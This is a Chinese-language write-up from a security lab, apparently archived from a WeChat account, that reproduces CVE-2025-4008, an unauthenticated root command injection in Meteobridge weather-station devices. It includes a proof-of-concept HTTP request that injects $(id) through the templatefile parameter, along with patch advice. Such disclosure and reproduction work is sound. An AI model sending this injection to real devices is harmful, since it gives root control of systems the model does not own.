@@ -1,0 +1,138 @@
+---
+cve: "CVE-2025-4008"
+source: "gelusus/wxvl 公众号漏洞文库"
+---
+
+#  【成功复现】Meteobridge命令执行漏洞(CVE-2025-4008)   
+原创 弥天安全实验室  弥天安全实验室   2025-06-06 00:46  
+  
+#   
+  
+网安引领时代，弥天点亮未来    
+   
+  
+  
+  
+  
+  
+   
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+  
+  
+**0x00写在前面**  
+  
+**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+  
+  
+**0x01漏洞介绍**  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hAXjj8rw5hfmde1ViaHeXXXPLnaoibDjxpicPD1K9GMr48iaMZRnmVWqKRW2ibmibnDOCPkkps3sp11T5mA/640?wx_fmt=png&from=appmsg "")  
+  
+Meteobridge是Meteobridge公司的一款小型设备，可将个人气象站连接到公共气象网络。  
+  
+Meteobridge存在安全漏洞，该漏洞源于Web接口端点存在命令注入漏洞，可能导致未经认证的远程攻击者以root权限执行任意命令。  
+  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+  
+  
+**0x02影响版本**  
+  
+Meteobridge  
+<= 6.1  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hAXjj8rw5hfmde1ViaHeXXXPY0erORX9PqjLYSHJd0jjbao5Us8tExFgSQc0zdk1aUaafy244HGtCA/640?wx_fmt=png&from=appmsg "")  
+  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+  
+  
+**0x03漏洞复现**  
+  
+  
+1.访问漏洞环境  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hAXjj8rw5hfmde1ViaHeXXXPb3ZWicX6FgsmR9ocMExhfz6Imrw6h0HtP0Y7n9RCUfkoyS6gNMrgrDg/640?wx_fmt=png&from=appmsg "")  
+  
+2.对漏洞进行复现  
+  
+   
+**POC**  
+  
+漏洞复现  
+```
+GET /public/template.cgi?templatefile=$(id) HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 
+```  
+  
+     执行id命令，通过相应判断漏洞存在  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hAXjj8rw5hfmde1ViaHeXXXPm8yric2dIRsv520OXg9gBK47ghdicUDTVndAqIOfsL0PwVh9icywppNpw/640?wx_fmt=png&from=appmsg "")  
+  
+  
+3.Yakit插件  
+测试  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hAXjj8rw5hfmde1ViaHeXXXPOHqx3p3TB4ROTVG8wqBR6SBcs1k5vPEOX3FocB4NhzjoE1bJnZpPAA/640?wx_fmt=png&from=appmsg "")  
+  
+  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+  
+  
+**0x04修复建议**  
+  
+  
+目前厂商已发布升级补丁以修复漏洞，补丁获取链接：  
+  
+可以通过检查Meteobridge的版本号来确定是否受影响，使用命令`cat /version`查看当前版本。  
+  
+建议尽快升级修复漏洞，再次声明本文仅供学习使用，非法他用责任自负！                       
+```
+https://forum.meteohub.de/viewtopic.php?t=18687
+https://www.onekey.com/resource/security-advisory-remote-command-execution-on-smartbedded-meteobridge-cve-2025-4008
+```  
+  
+  
+  
+弥天简介  
+  
+学海浩茫，予以风动，必降弥天之润！弥天安全实验室成立于2019年2月19日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。  
+  
+口号 网安引领时代，弥天点亮未来  
+  
+  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
+  
+   
+  
+  
+知识分享完了  
+  
+喜欢别忘了关注我们哦~  
+  
+学海浩茫，  
+  
+予以风动，  
+  
+必降弥天之润！  
+  
+  
+   弥  天  
+  
+安全实验室  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+  
+  
+  
+
+
+---
+
+> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
